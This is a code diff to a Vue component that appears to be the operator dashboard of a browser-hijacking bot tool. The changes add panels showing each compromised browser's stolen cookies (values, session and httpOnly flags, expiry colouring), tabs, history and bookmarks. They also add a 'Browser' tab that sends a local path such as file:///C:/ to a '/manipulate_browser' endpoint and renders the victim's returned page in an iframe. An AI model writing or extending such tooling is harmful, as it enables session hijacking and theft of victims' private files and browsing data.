@@ -160,7 +160,10 @@
                   </tr>
                 </thead>
                 <tbody>
-                  <tr v-for="bot in bots" v-bind:key="bot.id">
+                  <tr
+                    v-for="bot in Object.values(bots_map)"
+                    v-bind:key="bot.id"
+                  >
                     <td scope="row" style="vertical-align: middle">
                       <b-img
                         :src="bot.current_tab_image"
@@ -320,6 +323,9 @@
             ok-variant="secondary"
             ok-title="Close"
             size="xl"
+            lazy
+            scrollable
+            @hidden="reset_options_modal"
           >
             <p v-if="bots_map[id_bot_selected].current_tab">
               <a
@@ -352,29 +358,50 @@
               Bot UUID is <code>{{ bots_map[id_bot_selected].id }}</code>
             </p>
             <p>
-              <b-button-group>
-                <b-button variant="success" v-b-toggle.sidebar-tab
+              <b-button-group v-if="id_bot_selected">
+                <b-button
+                  variant="success"
+                  v-if="bots_map[id_bot_selected].tabs"
+                  v-on:click="tabs_tab_show = !tabs_tab_show"
+                  v-b-toggle.sidebar-tabs
                   >Tabs</b-button
                 >
-                <b-button variant="warning" v-b-toggle.sidebar-left
+                <b-button
+                  variant="warning"
+                  v-if="bots_map[id_bot_selected].history"
+                  v-on:click="history_tab_show = !history_tab_show"
+                  v-b-toggle.sidebar-history
                   >History</b-button
                 >
               </b-button-group>
-              <b-sidebar id="sidebar-tab" title="Tabs" right shadow width="500">
+
+              <!-- TABS -->
+            </p>
+
+            <p>
+              <b-sidebar
+                v-if="tabs_tab_show && bots_map[id_bot_selected].tabs"
+                id="sidebar-tabs"
+                title="Tabs"
+                right
+                shadow
+                width="500"
+              >
                 <b-list-group>
                   <b-list-group-item
                     v-for="tab in bots_map[id_bot_selected].tabs"
                     v-bind:key="tab.id"
                   >
-                    <b-link :href="tab.url">
-                      <b-avatar :src="tab.favIconUrl"></b-avatar>
-                      {{ tab.title }}</b-link
-                    >
+                    <b-link :href="tab.url"> {{ tab.title }}</b-link>
                   </b-list-group-item>
                 </b-list-group>
               </b-sidebar>
+
+              <!-- HISTORY -->
+
               <b-sidebar
-                id="sidebar-left"
+                v-if="history_tab_show && bots_map[id_bot_selected].history"
+                id="sidebar-tab"
                 title="History"
                 left
                 shadow
@@ -384,11 +411,11 @@
                   type="input"
                   class="form-control"
                   placeholder="filter"
-                  v-model="bot_history_search_word"
+                  v-model="history_search_word"
                   autofocus
                 />
                 <b-list-group>
-                  <b-list-group-item
+                  <!-- <b-list-group-item
                     v-for="history in bots_map[id_bot_selected].history.filter(
                       (item) => {
                         const url = item.url
@@ -397,8 +424,7 @@
                         const title = item.title
                           ? item.title.toString().toLowerCase()
                           : '';
-                        const searchWord =
-                          bot_history_search_word.toLowerCase();
+                        const searchWord = history_search_word.toLowerCase();
 
                         return (
                           url.includes(searchWord) || title.includes(searchWord)
@@ -408,6 +434,7 @@
                     v-bind:key="history.id"
                   >
                     <p>{{ calc_date(history.lastVisitTime) }}</p>
+                      <p>{{ history.lastVisitTime | moment("YYYY-MM-DD hh:mm:ss") }}</p>
                     <p>
                       <span>
                         <b-badge href="#" variant="primary">{{
@@ -417,37 +444,119 @@
                         history.title
                       }}</b-link>
                     </p>
-                  </b-list-group-item>
+                  </b-list-group-item> -->
+                  {{ bots_map[id_bot_selected].history[0] }}
                 </b-list-group>
               </b-sidebar>
             </p>
-            <hr />
-            <div class="input-group">
-              <div class="input-group-prepend">
-                <span class="input-group-text">Bot Name</span>
-              </div>
-              <input
-                type="text"
-                class="form-control"
-                placeholder="Please wait..."
-                v-model="options_selected_bot.name"
-                autofocus
-              />
-              <b-form-checkbox
-                v-for="key in Object.keys(options_selected_bot.switch_config)"
-                v-bind:key="key"
-                v-model="options_selected_bot.switch_config[key]"
-                >{{ key }}</b-form-checkbox
-              >
-              <b-button variant="primary" v-on:click="update_bot_name">
-                <font-awesome-icon
-                  :icon="['fas', 'edit']"
-                  class="icon alt mr-1 ml-1"
-                />
-                Update
-              </b-button>
-            </div>
-            <hr />
+            <p>
+              <b-tabs content-class="mt-3" lazy>
+                <b-tab title="Cookies">
+                  <div style="overflow-x: auto">
+                    <b-input-group size="sm">
+                      <b-form-input
+                        id="cookies-filter-input"
+                        v-model="cookies_search_word"
+                        type="search"
+                        placeholder="Search domain or name or value"
+                      ></b-form-input>
+
+                      <b-input-group-append>
+                        <b-button
+                          :disabled="!cookies_search_word"
+                          @click="cookies_search_word = ''"
+                          >Clear</b-button
+                        >
+                      </b-input-group-append>
+                    </b-input-group>
+
+                    <b-table
+                      id="cookies_table"
+                      :items="bots_map[id_bot_selected].cookies"
+                      :field="cookies_fields"
+                      :current-page="cookies_page"
+                      :per-page="cookies_page_size"
+                      :filter="cookies_search_word"
+                      :filter-included-fields="filterOn"
+                      small
+                      hover
+                      :tbody-tr-class="cookies_row_class"
+                      @filtered="on_cookies_filtered"
+                    ></b-table>
+                  </div>
+                  <b-pagination
+                    striped
+                    hover
+                    fixed
+                    responsive
+                    stacked
+                    v-model="cookies_page"
+                    :total-rows="bot_length_map[id_bot_selected].cookies"
+                    :per-page="cookies_page_size"
+                    aria-controls="cookies_table"
+                  ></b-pagination>
+                </b-tab>
+                <b-tab title="BookMarks">
+                  <b-tree-view
+                    :data="bots_map[id_bot_selected].bookmarks"
+                    nodeLabelProp="title"
+                  >
+                    <template v-slot="{ node: { title, url } }">
+                      <b-link :href="url">{{ title }}</b-link>
+                    </template>
+                  </b-tree-view>
+                </b-tab>
+                <b-tab title="Config">
+                  <div class="input-group">
+                    <div class="input-group-prepend">
+                      <span class="input-group-text">Bot Name</span>
+                    </div>
+
+                    <input
+                      type="text"
+                      class="form-control"
+                      placeholder="Please wait..."
+                      v-model="selected_bot.name"
+                      autofocus
+                    />
+                  </div>
+                  <div class="input-group">
+                    <div class="input-group-prepend">
+                      <span class="input-group-text">Bot Switch</span>
+                    </div>
+                    <b-form-checkbox
+                      v-for="key in Object.keys(selected_bot.switch_config)"
+                      v-bind:key="key"
+                      v-model="selected_bot.switch_config[key]"
+                      >{{ key }}</b-form-checkbox
+                    >
+                  </div>
+
+                  <b-button variant="primary" v-on:click="update_bot_config">
+                    <font-awesome-icon
+                      :icon="['fas', 'edit']"
+                      class="icon alt mr-1 ml-1"
+                    />
+                    Update
+                  </b-button>
+                </b-tab>
+                <b-tab title="Browser">
+                  <p>
+                    <b-input-group prepend="Path" class="mt-3">
+                      <b-form-input v-model="check_path"></b-form-input>
+                      <b-input-group-append>
+                        <b-button variant="info" v-on:click="manipulate"
+                          >Check</b-button
+                        >
+                      </b-input-group-append>
+                    </b-input-group>
+                  </p>
+                  <p>
+                    <iframe ref="browser_page"></iframe>
+                  </p>
+                </b-tab>
+              </b-tabs>
+            </p>
           </b-modal>
         </div>
         <!-- Update user password modal -->
@@ -534,11 +643,66 @@ export default {
         },
       },
       loading: false,
-      bots: [],
       bots_map: {},
-      options_selected_bot: {},
+
+      bot_length_map: {},
+
+      selected_bot: {},
       id_bot_selected: null,
-      bot_history_search_word: "",
+      history_tab_show: false,
+
+      tabs_tab_show: false,
+
+      history_search_word: "",
+      history_page: 1,
+      history_page_size: 20,
+
+      cookies_search_word: "",
+      cookies_page: 1,
+      cookies_page_size: 20,
+      cookies_item_length: 0,
+      cookies_fields: [
+        { key: "domain", label: "domain", sortable: true },
+        { key: "name", label: "name", sortable: true },
+        {
+          key: "hostOnly",
+          label: "hostOnly",
+          sortable: true,
+          formatter: (value) => {
+            return value === true ? "✅" : "🚫";
+          },
+        },
+        {
+          key: "httpOnly",
+          label: "httpOnly",
+          sortable: true,
+          formatter: (value) => {
+            return value === true ? "✅" : "🚫";
+          },
+        },
+
+        { key: "path", label: "path", sortable: true },
+        { key: "sameSite", label: "sameSite", sortable: true },
+        {
+          key: "secure",
+          label: "secure",
+          sortable: true,
+          formatter: (value) => {
+            return value === true ? "✅" : "🚫";
+          },
+        },
+        {
+          key: "session",
+          label: "session",
+          sortable: true,
+          formatter: (value) => {
+            return value === true ? "✅" : "🚫";
+          },
+        },
+        { key: "storeId", label: "storeId", sortable: true },
+        { key: "value", label: "value", sortable: true },
+      ],
+      check_path: "file:///C:/",
     };
   },
   computed: {
@@ -596,11 +760,11 @@ export default {
       this.user.password_should_be_changed =
         login_result.password_should_be_changed;
     },
-    async update_bot_name() {
+    async update_bot_config() {
       await api_request("PUT", "/bots", {
-        bot_id: this.options_selected_bot.id,
-        name: this.options_selected_bot.name,
-        switch_config: this.options_selected_bot.switch_config,
+        bot_id: this.selected_bot.id,
+        name: this.selected_bot.name,
+        switch_config: this.selected_bot.switch_config,
       });
       this.$toastr.s("Bot renamed successfully.");
       this.refresh_bots();
@@ -612,18 +776,45 @@ export default {
       this.$toastr.s("Bot deleted successfully.");
       this.refresh_bots();
     },
+    async manipulate() {
+      const response = await api_request("POST", "/manipulate_browser", {
+        bot_id: this.id_bot_selected,
+        path: this.check_path,
+      });
+      console.log(response);
+      const iframe = this.$refs.browser_page;
+      const iframeDocument =
+        iframe.contentDocument || iframe.contentWindow.document;
+
+      iframeDocument.open();
+      iframeDocument.write(response.html);
+      iframeDocument.close();
+    },
     bot_open_options(bot_id) {
+      console.log(bot_id);
       this.id_bot_selected = bot_id;
-      this.options_selected_bot = copy(this.get_selected_bot(bot_id));
+      this.selected_bot = copy(this.bots_map[bot_id]);
       this.$nextTick(() => {
         this.$bvModal.show("bot_options_modal");
       });
     },
+    reset_options_modal() {
+      this.history_tab_show = false;
+      this.tabs_tab_show = false;
+      this.selected_bot = {};
+      this.id_bot_selected = null;
+      this.check_path = "file:///C:/";
+    },
     async refresh_bots() {
       const response = await api_request("GET", "/bots", false);
-      this.bots = response.bots;
       response.bots.map((bot) => {
         this.bots_map[bot.id] = bot;
+        this.bot_length_map[bot.id] = {
+          cookies: bot.cookies ? bot.cookies.length : 0,
+          history: bot.history ? bot.history.length : 0,
+          bookmarks: bot.bookmarks ? bot.bookmarks.length : 0,
+          tabs: bot.tabs ? bot.tabs.length : 0,
+        };
       });
     },
     download_ca() {
@@ -632,24 +823,26 @@ export default {
     copy_toast() {
       this.$toastr.s("Copied to clipboard successfully.");
     },
-    get_selected_bot(options_selected_bot_id) {
-      if (options_selected_bot_id === null) {
-        return null;
-      }
-
-      const matching_bot = this.bots.filter((bot) => {
-        return bot.id === options_selected_bot_id;
-      });
-      return matching_bot[0];
-    },
     calc_date(timestamp) {
       const date = new Date(timestamp);
       const year = date.getFullYear();
       const month = (date.getMonth() + 1).toString().padStart(2, "0");
-      const day = date.getDate().toString().padStart(2, "0");
-      const hours = date.getHours().toString().padStart(2, "0");
-      const minutes = date.getMinutes().toString().padStart(2, "0");
-      const seconds = date.getSeconds().toString().padStart(2, "0");
+      const day = date
+        .getDate()
+        .toString()
+        .padStart(2, "0");
+      const hours = date
+        .getHours()
+        .toString()
+        .padStart(2, "0");
+      const minutes = date
+        .getMinutes()
+        .toString()
+        .padStart(2, "0");
+      const seconds = date
+        .getSeconds()
+        .toString()
+        .padStart(2, "0");
       const formattedDateTime = `${year}年${month}月${day}号 ${hours}:${minutes}:${seconds}`;
       return formattedDateTime;
     },
@@ -658,9 +851,34 @@ export default {
       this.user.is_authenticated = false;
       this.user.password_should_be_changed = null;
     },
+    cookies_row_class(item, type) {
+      try {
+        if (!item || type !== "row" || !item.expirationDate) {
+          return;
+        }
+
+        const cookie_expiration_date = new Date(item.expirationDate);
+        const current_time = new Date();
+        const expiration_warning_time = 1000 * 60 * 60 * 1; // 1 hour
+
+        if (current_time - cookie_expiration_date > expiration_warning_time) {
+          return "table-success";
+        } else if (current_time - cookie_expiration_date > 0) {
+          return "table-warning";
+        } else {
+          return "table-danger";
+        }
+      } catch (e) {
+        console.log(e);
+      }
+    },
+    on_cookies_filtered(filtered_items) {
+      this.cookies_page = 1;
+      this.cookies_item_length = filtered_items.length;
+    },
   },
   // Run on page load
-  mounted: async function () {
+  mounted: async function() {
     new ClipboardJS(".copy-element"); // eslint-disable-line
 
     // Update auth status
